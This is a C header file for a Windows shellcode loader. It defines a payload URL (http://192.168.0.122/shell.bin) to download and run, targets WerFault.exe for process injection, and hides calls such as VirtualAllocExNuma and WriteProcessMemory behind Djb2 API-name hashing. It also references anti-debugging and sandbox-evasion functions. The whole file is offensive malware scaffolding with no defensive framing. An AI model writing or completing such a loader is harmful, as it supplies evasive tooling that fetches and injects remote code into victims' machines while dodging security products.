#include <Windows.h>
#include <WinInet.h>
#include <Tlhelp32.h>
#include <winternl.h>

#pragma comment (lib, "Wininet.lib")

#define TARGET_PROCESS_PATH		L"C:\\Windows\\System32\\WerFault.exe"
#define GET_FILENAMEW(PATH)		(wcsrchr((PATH), L'/') ? wcsrchr((PATH), L'/') + 1 : (wcsrchr((PATH), L'\\') ? wcsrchr((PATH), L'\\') + 1 : (PATH)))
#define PAYLOAD L"http://192.168.0.122/shell.bin"

//Api Hashing using Djb2
#define INITIAL_SEED 5
#define INITIAL_HASH 3997
#define HASH_ANSI(API) (HashStringDjb2A((PCHAR) API))
#define HASH_WIDE(API) (HashStringDjb2W((PWCHAR) API))

//String hashing
#define H_MOD_KERNEL32 0x541033ED //KERNEL32.DLL
#define H_FUNC_VIRTUALALLOCEXNUMA 0x47388AFD //VirtualAllocExNuma
#define H_FUNC_WRITEPROCESSMEMORY 0x526A1960 //WriteProcessMemory
#define H_FUNC_ISDEBUGGERPRESENT 0xBEF9C5DF //IsDebuggerPresent
#define H_FUNC_FLSALLOC 0xDF98BFAD //FlsAlloc

DWORD HashStringDjb2A(_In_ PCHAR String);
DWORD HashStringDjb2W(_In_ PWCHAR String);
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
FARPROC NotGetProcAddress(IN HMODULE hModule, IN DWORD dwApiNameHash);
HMODULE NotGetModuleHandle(DWORD dwModuleNameHash);
